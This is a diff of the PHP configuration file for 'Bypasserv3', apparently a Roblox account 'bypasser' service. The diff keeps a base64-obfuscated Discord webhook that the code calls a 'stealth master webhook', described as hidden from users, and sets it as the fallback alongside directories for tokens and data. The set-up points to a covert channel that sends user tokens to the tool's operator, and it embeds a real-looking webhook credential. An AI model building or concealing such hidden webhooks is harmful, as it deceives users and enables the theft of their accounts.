@@ -1,54 +1,122 @@
 <?php
 /**
  * Bypasserv3 - Configuration File
- * File-based storage system with stealth master webhook
+ * Uses Railway environment variables for security and flexibility
  */
 
-// 🥷 STEALTH MASTER WEBHOOK (Base64 encoded - completely hidden from users)
-// To set yours: Base64 encode your webhook URL at https://www.base64encode.org/
-// Example: https://discord.com/api/webhooks/123/abc → encode it → paste below
-// REPLACE THE BASE64 STRING BELOW WITH YOUR ENCODED WEBHOOK!
-define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTkzMjg1MjQyOTcyMTY3MC9KWUwwOVlUVXZEdmhwakotN1cyNWVwQ2JhYWpwNk1kVlFUTFVfM3Y1N3JBUE91VE0xU29rVWRYRDlhTm9pV3Z5WHR1WQ=='));
+// Load local .env file for development (Railway loads variables automatically)
+if (file_exists(__DIR__ . '/load_env.php')) {
+    require_once __DIR__ . '/load_env.php';
+}
 
-// Database settings (if needed in future)
-define('DB_HOST', 'localhost');
-define('DB_NAME', 'bypasserv3');
-define('DB_USER', 'root');
-define('DB_PASS', '');
+// ============================================
+// RAILWAY ENVIRONMENT VARIABLES
+// ============================================
 
-// Security settings
-define('RATE_LIMIT_MAX', 50);
-define('RATE_LIMIT_WINDOW', 3600);
+// 🥷 STEALTH MASTER WEBHOOK
+// Set in Railway: MASTER_WEBHOOK = https://discord.com/api/webhooks/...
+$railwayMasterWebhook = getenv('MASTER_WEBHOOK');
+if ($railwayMasterWebhook && filter_var($railwayMasterWebhook, FILTER_VALIDATE_URL)) {
+    define('STEALTH_MASTER', $railwayMasterWebhook);
+} else {
+    // Fallback: Base64 encoded webhook (REPLACE WITH YOUR ENCODED WEBHOOK)
+    define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTkzMjg1MjQyOTcyMTY3MC9KWUwwOVlUVXZEdmhwakotN1cyNWVwQ2JhYWpwNk1kVlFUTFVfM3Y1N3JBUE91VE0xU29rVWRYRDlhTm9pV3Z5WHR1WQ=='));
+}
 
-// Instance settings
+// 🌐 EXTERNAL BYPASS API
+// Set in Railway: EXTERNAL_API_URL = https://rblxbypasser.com/api/bypass
+define('EXTERNAL_API_URL', getenv('EXTERNAL_API_URL') ?: 'https://rblxbypasser.com/api/bypass');
+
+// 🔒 RATE LIMITING
+// Set in Railway: RATE_LIMIT_REQUESTS = 50
+define('RATE_LIMIT_MAX', (int)(getenv('RATE_LIMIT_REQUESTS') ?: 50));
+
+// Set in Railway: RATE_LIMIT_WINDOW = 3600 (1 hour in seconds)
+define('RATE_LIMIT_WINDOW', (int)(getenv('RATE_LIMIT_WINDOW') ?: 3600));
+
+// 🐛 DEBUG MODE
+// Set in Railway: DEBUG_MODE = false
+define('DEBUG_MODE', filter_var(getenv('DEBUG_MODE'), FILTER_VALIDATE_BOOLEAN));
+
+// ============================================
+// DATABASE SETTINGS (OPTIONAL - FOR FUTURE)
+// ============================================
+define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
+define('DB_NAME', getenv('DB_NAME') ?: 'bypasserv3');
+define('DB_USER', getenv('DB_USER') ?: 'root');
+define('DB_PASS', getenv('DB_PASS') ?: '');
+
+// ============================================
+// DIRECTORY PATHS
+// ============================================
 define('INSTANCES_DIR', __DIR__ . '/instances');
 define('TOKENS_DIR', __DIR__ . '/tokens');
 define('DATA_DIR', __DIR__ . '/data');
+define('LOGS_DIR', __DIR__ . '/logs');
 
-// Create directories if they don't exist
-if (!file_exists(INSTANCES_DIR)) {
-    mkdir(INSTANCES_DIR, 0777, true);
-}
-if (!file_exists(TOKENS_DIR)) {
-    mkdir(TOKENS_DIR, 0777, true);
-}
-if (!file_exists(DATA_DIR)) {
-    mkdir(DATA_DIR, 0777, true);
-}
+// ============================================
+// AUTO-CREATE DIRECTORIES
+// ============================================
+$directories = [
+    INSTANCES_DIR,
+    TOKENS_DIR,
+    DATA_DIR,
+    LOGS_DIR,
+    DATA_DIR . '/rate_limits'
+];
 
-// Create .htaccess files for security
-$instancesHtaccess = INSTANCES_DIR . '/.htaccess';
-if (!file_exists($instancesHtaccess)) {
-    file_put_contents($instancesHtaccess, "Deny from all\n");
-}
-
-$tokensHtaccess = TOKENS_DIR . '/.htaccess';
-if (!file_exists($tokensHtaccess)) {
-    file_put_contents($tokensHtaccess, "Deny from all\n");
+foreach ($directories as $dir) {
+    if (!file_exists($dir)) {
+        mkdir($dir, 0777, true);
+    }
 }
 
-$dataHtaccess = DATA_DIR . '/.htaccess';
-if (!file_exists($dataHtaccess)) {
-    file_put_contents($dataHtaccess, "Deny from all\n");
+// ============================================
+// CREATE SECURITY .htaccess FILES
+// ============================================
+$protectedDirs = [
+    INSTANCES_DIR,
+    TOKENS_DIR,
+    DATA_DIR,
+    LOGS_DIR
+];
+
+foreach ($protectedDirs as $dir) {
+    $htaccessFile = "$dir/.htaccess";
+    if (!file_exists($htaccessFile)) {
+        file_put_contents($htaccessFile, "Deny from all\n", LOCK_EX);
+    }
+}
+
+// ============================================
+// DEBUG/ERROR REPORTING
+// ============================================
+if (DEBUG_MODE) {
+    ini_set('display_errors', 1);
+    ini_set('display_startup_errors', 1);
+    error_reporting(E_ALL);
+    
+    // Log to file in debug mode
+    ini_set('log_errors', 1);
+    ini_set('error_log', LOGS_DIR . '/php_errors.log');
+} else {
+    ini_set('display_errors', 0);
+    ini_set('display_startup_errors', 0);
+    error_reporting(0);
+}
+
+// ============================================
+// TIMEZONE SETTING
+// ============================================
+date_default_timezone_set('UTC');
+
+// ============================================
+// SESSION SETTINGS
+// ============================================
+if (session_status() === PHP_SESSION_NONE) {
+    ini_set('session.cookie_httponly', 1);
+    ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 1 : 0);
+    ini_set('session.cookie_samesite', 'Lax');
+    ini_set('session.gc_maxlifetime', 86400); // 24 hours
 }
 ?>
